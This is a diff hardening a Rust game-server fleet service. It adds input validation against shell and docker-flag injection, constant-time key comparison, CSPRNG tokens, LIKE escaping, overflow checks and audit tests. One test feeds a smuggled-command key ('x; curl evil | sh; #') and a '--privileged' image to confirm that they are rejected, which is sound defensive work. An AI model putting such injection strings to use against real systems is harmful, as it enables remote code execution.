@@ -635,10 +635,12 @@ fn parse_scale_answer(v: &serde_json::Value) -> std::result::Result<Option<i32>,
     if body["scale"].as_bool() != Some(true) {
         return Ok(None);
     }
-    body["replicas"]
+    let r = body["replicas"]
         .as_i64()
-        .map(|r| Some(r as i32))
-        .ok_or_else(|| "scale without replicas".to_string())
+        .ok_or_else(|| "scale without replicas".to_string())?;
+    i32::try_from(r)
+        .map(Some)
+        .map_err(|_| format!("replicas {r} out of range"))
 }
 
 fn one() -> u32 {
@@ -752,7 +754,7 @@ impl ChainEntry {
     pub fn applies(&self, now: OffsetDateTime) -> bool {
         self.when
             .as_ref()
-            .is_none_or(|w| w.matches(now.weekday().number_days_from_sunday(), now.hour()))
+            .is_none_or(|w| w.matches(now.weekday().number_days_from_monday(), now.hour()))
     }
 }
 
@@ -1422,6 +1424,55 @@ pub fn port_bindings(spec: &FleetSpec, primary: i32) -> Vec<(String, i32, i32, &
     out
 }
 
+/// Is `k` a sane environment variable name? Keys end up unquoted in `env K=V` ssh scripts, in
+/// `docker run -e K=V` and on the firecracker kernel command line.
+fn valid_env_key(k: &str) -> bool {
+    !k.is_empty()
+        && k.len() <= 128
+        && !k.as_bytes()[0].is_ascii_digit()
+        && k.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
+}
+
+fn validate_env_map(what: &str, env: &HashMap<String, String>) -> Result<()> {
+    for (k, v) in env {
+        if !valid_env_key(k) {
+            return Err(Error::InvalidArgument(format!(
+                "{what} key `{k}`: [A-Za-z_][A-Za-z0-9_]*"
+            )));
+        }
+        if v.len() > 32 * 1024 || v.bytes().any(|b| b == 0 || b == b'\n' || b == b'\r') {
+            return Err(Error::InvalidArgument(format!(
+                "{what} value for `{k}`: up to 32 KiB, no NUL/newline"
+            )));
+        }
+    }
+    Ok(())
+}
+
+/// `spec.env` keys and values, and `spec.image`: the providers splice them into shell scripts,
+/// `docker run` argv and kernel command lines, so they are restricted to what cannot change the
+/// meaning of those strings.
+pub fn validate_env(spec: &FleetSpec) -> Result<()> {
+    validate_env_map("spec.env", &spec.env)?;
+    if let Some(i) = &spec.install {
+        validate_env_map("spec.install.env", &i.env)?;
+    }
+    if let Some(img) = &spec.image {
+        let ok = !img.is_empty()
+            && img.len() <= 512
+            && !img.starts_with('-')
+            && img
+                .bytes()
+                .all(|b| b.is_ascii_alphanumeric() || b"._-/:@".contains(&b));
+        if !ok {
+            return Err(Error::InvalidArgument(
+                "spec.image: image reference ([A-Za-z0-9._/:@-], not starting with '-')".into(),
+            ));
+        }
+    }
+    Ok(())
+}
+
 pub fn validate_secret_env(spec: &FleetSpec) -> Result<()> {
     if spec.secret_env.len() > 64 {
         return Err(Error::InvalidArgument(
@@ -1951,7 +2002,9 @@ pub fn apply_counter(
         count = c;
     }
     if let Some(d) = a.delta {
-        count += d;
+        count = count.checked_add(d).ok_or_else(|| {
+            Error::InvalidArgument(format!("counter {name}: delta {d} overflows"))
+        })?;
         if count < 0 {
             return Err(Error::InvalidArgument(format!(
                 "counter {name} would go below zero"
@@ -1983,6 +2036,9 @@ pub fn apply_list(lists: &mut serde_json::Value, name: &str, a: &ListAction) -> 
     if let Some(v) = &a.values {
         values.clear();
         for x in v {
+            if x.len() > 256 {
+                return Err(Error::InvalidArgument("list value too long".into()));
+            }
             if !values.contains(x) {
                 values.push(x.clone());
             }
@@ -2689,7 +2745,15 @@ pub struct LocalProcessProvider {
 /// Run an install command locally with a wall-clock limit; never fails on exit status.
 pub async fn run_install_local(spec: &FleetSpec, i: &InstallSpec, target: &str) -> InstallRun {
     let started = std::time::Instant::now();
-    let (bin, args) = i.command.split_first().expect("validated");
+    let Some((bin, args)) = i.command.split_first() else {
+        return InstallRun {
+            target: target.to_string(),
+            ok: false,
+            exit_code: None,
+            output: "install.command is empty".into(),
+            duration_ms: 0,
+        };
+    };
     let mut cmd = tokio::process::Command::new(bin);
     cmd.args(args)
         .envs(&spec.env)
@@ -2740,7 +2804,7 @@ pub async fn run_install_local(spec: &FleetSpec, i: &InstallSpec, target: &str) 
 impl LocalProcessProvider {
     /// Capture stdout/stderr of every server started from now on into `sink`.
     pub fn set_log_sink(&self, sink: LogSink) {
-        *self.sink.write().unwrap() = Some(sink);
+        *self.sink.write().unwrap_or_else(|e| e.into_inner()) = Some(sink);
     }
 }
 
@@ -2798,7 +2862,7 @@ impl Provider for LocalProcessProvider {
                 .env("MUSUBI_SERVER_KEY", req.server_key)
                 .kill_on_drop(true)
                 .stdin(std::process::Stdio::null());
-            let sink = self.sink.read().unwrap().clone();
+            let sink = self.sink.read().unwrap_or_else(|e| e.into_inner()).clone();
             if sink.is_some() {
                 cmd.stdout(std::process::Stdio::piped())
                     .stderr(std::process::Stdio::piped());
@@ -3014,21 +3078,16 @@ impl FleetService {
         &self.api_url
     }
 
-    /// Constant-time-irrelevant equality for the shared server key (used by capability routes).
+    /// Constant-time equality for the shared server key (used by capability routes).
     pub fn server_key_matches(&self, k: &str) -> bool {
-        !self.server_key.is_empty() && self.server_key == k
+        !self.server_key.is_empty() && constant_time_eq(self.server_key.as_bytes(), k.as_bytes())
     }
 
     /// Mint the credential a game server process authenticates with on `/v1/gameserver/*`:
     /// `gs_<server id>_<random>`, scoped to that one server. Only its SHA-256 is stored, so the
     /// plaintext exists in the process environment and nowhere else; issuing again rotates it.
     pub async fn issue_server_token(&self, id: Uuid) -> Result<String> {
-        let token = format!(
-            "gs_{}_{}{}",
-            id.simple(),
-            Uuid::now_v7().simple(),
-            Uuid::now_v7().simple()
-        );
+        let token = format!("gs_{}_{}", id.simple(), random_token());
         let n = sqlx::query(
             "update musubi.game_servers set server_token_hash = $2, updated_at = now() where id = $1 and state <> 'terminated'",
         )
@@ -3150,7 +3209,7 @@ impl FleetService {
              where fleet_id = $1 and server_id = $2
                and ($3::text is null or level = $3)
                and ($4::text is null or source = $4)
-               and ($5::text is null or message ilike '%' || $5 || '%')
+               and ($5::text is null or message ilike '%' || $5 || '%' escape '\\')
                and ($6::timestamptz is null or at < $6)
                and ($7::timestamptz is null or at > $7)
              order by at desc limit $8",
@@ -3159,7 +3218,7 @@ impl FleetService {
         .bind(server_id)
         .bind(q.level.as_deref())
         .bind(q.source.as_deref())
-        .bind(q.q.as_deref())
+        .bind(q.q.as_deref().map(like_escape))
         .bind(
             q.before
                 .and_then(|b| OffsetDateTime::from_unix_timestamp(b).ok()),
@@ -3612,6 +3671,7 @@ impl FleetService {
 
     pub async fn create(&self, mut c: CreateFleet) -> Result<Fleet> {
         validate_slots(&c.spec)?;
+        validate_env(&c.spec)?;
         validate_secret_env(&c.spec)?;
         seal_secret_env(&mut c.spec);
         if c.name.is_empty() || c.name.len() > 64 {
@@ -4172,7 +4232,7 @@ impl FleetService {
         for (name, a) in &req.list_actions {
             apply_list(&mut gs.lists, name, a)?;
         }
-        let token = format!("{}{}", Uuid::now_v7().simple(), Uuid::now_v7().simple());
+        let token = random_token();
         let entry = serde_json::json!({ "payload": req.payload, "at": OffsetDateTime::now_utc().unix_timestamp(), "token": token });
         sqlx::query(
             "update musubi.game_servers set allocation = coalesce(allocation, '{}'::jsonb) || jsonb_build_object('slots',
@@ -4322,7 +4382,7 @@ impl FleetService {
         for (name, a) in &req.list_actions {
             apply_list(&mut gs.lists, name, a)?;
         }
-        let fresh_token = format!("{}{}", Uuid::now_v7().simple(), Uuid::now_v7().simple());
+        let fresh_token = random_token();
         let entry = serde_json::json!({ "payload": req.payload, "at": OffsetDateTime::now_utc().unix_timestamp(), "token": fresh_token });
         let shared = gs.state != "ready";
         let token = if shared {
@@ -4332,9 +4392,7 @@ impl FleetService {
                     .fetch_one(&mut *tx)
                     .await
                     .map_err(Error::internal)?;
-            let token = existing.unwrap_or_else(|| {
-                format!("{}{}", Uuid::now_v7().simple(), Uuid::now_v7().simple())
-            });
+            let token = existing.unwrap_or_else(random_token);
             sqlx::query(
                 "update musubi.game_servers set allocation = coalesce(allocation, '{}'::jsonb) || jsonb_build_object('backfill',
                         coalesce(allocation->'backfill', '[]'::jsonb) || jsonb_build_array($2::jsonb)),
@@ -5392,6 +5450,7 @@ impl FleetService {
     /// Register a build. `canary_percent` 0 makes it active right away (the previous active build
     /// is retired, kept for rollback); > 0 makes it a canary alongside the current active build.
     pub async fn add_build(&self, fleet_id: Uuid, mut c: CreateBuild) -> Result<FleetBuild> {
+        validate_env(&c.spec)?;
         validate_secret_env(&c.spec)?;
         seal_secret_env(&mut c.spec);
         let v = c.version.trim();
@@ -6001,6 +6060,7 @@ impl FleetService {
     ) -> std::result::Result<Option<i32>, String> {
         let client = reqwest::Client::builder()
             .timeout(Duration::from_millis(w.timeout_ms.clamp(100, 10_000)))
+            .redirect(reqwest::redirect::Policy::none())
             .build()
             .map_err(|e| e.to_string())?;
         let mut req = client.post(&w.url).json(&serde_json::json!({
@@ -6767,14 +6827,171 @@ mod ports_tests {
     }
 }
 
+/// A port an orchestrator reported, or `None` when it is not a valid TCP/UDP port (providers used
+/// to truncate with `as i32`).
+pub fn port_from_i64(p: i64) -> Option<i32> {
+    i32::try_from(p).ok().filter(|p| (1..=65_535).contains(p))
+}
+
+/// Escape `LIKE` metacharacters so a search string matches literally (used with `escape '\\'`).
+fn like_escape(s: &str) -> String {
+    s.replace('\\', "\\\\")
+        .replace('%', "\\%")
+        .replace('_', "\\_")
+}
+
 fn server_token_hash(token: &str) -> String {
     use sha2::Digest;
     hex::encode(sha2::Sha256::digest(token.as_bytes()))
 }
 
 fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
-    if a.len() != b.len() {
-        return false;
+    use subtle::ConstantTimeEq;
+    a.len() == b.len() && bool::from(a.ct_eq(b))
+}
+
+/// 256 bits from the OS CSPRNG as 64 hex chars — connect and game-server tokens. (v7 uuids are
+/// time-ordered with a per-millisecond counter, so two of them carry far fewer random bits.)
+fn random_token() -> String {
+    use ring::rand::SecureRandom;
+    let mut b = [0u8; 32];
+    ring::rand::SystemRandom::new()
+        .fill(&mut b)
+        .expect("OS CSPRNG unavailable");
+    hex::encode(b)
+}
+
+#[cfg(test)]
+mod audit_tests {
+    use super::*;
+    use time::macros::datetime;
+
+    #[test]
+    fn tokens_are_long_random_and_unique() {
+        let a = random_token();
+        let b = random_token();
+        assert_eq!(a.len(), 64);
+        assert!(a.bytes().all(|c| c.is_ascii_hexdigit()));
+        assert_ne!(a, b);
+        assert_eq!(hex::decode(&a).unwrap().len(), 32);
     }
-    a.iter().zip(b).fold(0u8, |acc, (x, y)| acc | (x ^ y)) == 0
+
+    #[test]
+    fn constant_time_eq_compares_bytes() {
+        assert!(constant_time_eq(b"abc", b"abc"));
+        assert!(!constant_time_eq(b"abc", b"abd"));
+        assert!(!constant_time_eq(b"abc", b"abcd"));
+        assert!(constant_time_eq(b"", b""));
+    }
+
+    #[test]
+    fn chain_window_uses_monday_based_weekdays_like_schedule() {
+        // 2024-01-06 is a Saturday: ScheduleWindow numbers it 5 (from Monday)
+        let e = ChainEntry {
+            id: "w".into(),
+            when: Some(ChainWindow {
+                days: vec![5],
+                from_hour: 0,
+                to_hour: 24,
+            }),
+            ..Default::default()
+        };
+        assert!(e.applies(datetime!(2024-01-06 12:00 UTC)));
+        assert!(!e.applies(datetime!(2024-01-07 12:00 UTC)));
+    }
+
+    #[test]
+    fn scale_answer_rejects_out_of_range_replicas() {
+        assert!(
+            parse_scale_answer(&serde_json::json!({"scale": true, "replicas": 1i64 << 40}))
+                .is_err()
+        );
+        assert_eq!(
+            parse_scale_answer(&serde_json::json!({"scale": true, "replicas": -1})),
+            Ok(Some(-1))
+        );
+    }
+
+    #[test]
+    fn counter_delta_overflow_is_an_error_not_a_panic() {
+        let mut c = serde_json::json!({"rooms": {"count": i64::MAX - 1, "capacity": i64::MAX}});
+        let a = CounterAction {
+            delta: Some(5),
+            ..Default::default()
+        };
+        assert!(matches!(
+            apply_counter(&mut c, "rooms", &a),
+            Err(Error::InvalidArgument(_))
+        ));
+    }
+
+    #[test]
+    fn list_values_replacement_is_length_checked() {
+        let mut l = serde_json::json!({});
+        let a = ListAction {
+            values: Some(vec!["x".repeat(257)]),
+            capacity: Some(10),
+            ..Default::default()
+        };
+        assert!(apply_list(&mut l, "players", &a).is_err());
+        let ok = ListAction {
+            values: Some(vec!["a".into(), "a".into()]),
+            capacity: Some(10),
+            ..Default::default()
+        };
+        apply_list(&mut l, "players", &ok).unwrap();
+        assert_eq!(l["players"]["values"], serde_json::json!(["a"]));
+    }
+
+    #[tokio::test]
+    async fn empty_install_command_does_not_panic() {
+        let spec = FleetSpec::default();
+        let i = InstallSpec::default();
+        let r = run_install_local(&spec, &i, "node:test").await;
+        assert!(!r.ok);
+        assert!(r.output.contains("empty"));
+    }
+
+    #[test]
+    fn env_keys_image_and_values_are_validated() {
+        let mut spec = FleetSpec::default();
+        spec.env.insert("GAME_MODE".into(), "ctf".into());
+        assert!(validate_env(&spec).is_ok());
+        spec.env.insert("x; curl evil | sh; #".into(), "1".into());
+        assert!(validate_env(&spec).is_err(), "shell metacharacters in key");
+        spec.env.clear();
+        spec.env.insert("1ABC".into(), "1".into());
+        assert!(validate_env(&spec).is_err(), "leading digit");
+        spec.env.clear();
+        spec.env.insert("A".into(), "line1\nline2".into());
+        assert!(validate_env(&spec).is_err(), "newline in value");
+        spec.env.clear();
+        spec.image = Some("--privileged".into());
+        assert!(validate_env(&spec).is_err(), "docker flag injection");
+        spec.image = Some("ghcr.io/acme/game:1.2.3@sha256:abcd".into());
+        assert!(validate_env(&spec).is_ok());
+        spec.image = Some("img with space".into());
+        assert!(validate_env(&spec).is_err());
+        spec.image = None;
+        spec.install = Some(InstallSpec {
+            env: [("BAD KEY".to_string(), "v".to_string())].into(),
+            ..Default::default()
+        });
+        assert!(validate_env(&spec).is_err(), "install env key");
+    }
+
+    #[test]
+    fn like_patterns_are_escaped() {
+        assert_eq!(like_escape("100%_done\\"), "100\\%\\_done\\\\");
+        assert_eq!(like_escape("plain"), "plain");
+    }
+
+    #[test]
+    fn provider_ports_are_range_checked() {
+        assert_eq!(port_from_i64(7777), Some(7777));
+        assert_eq!(port_from_i64(0), None);
+        assert_eq!(port_from_i64(65_536), None);
+        assert_eq!(port_from_i64(-1), None);
+        assert_eq!(port_from_i64(1i64 << 40), None);
+    }
 }
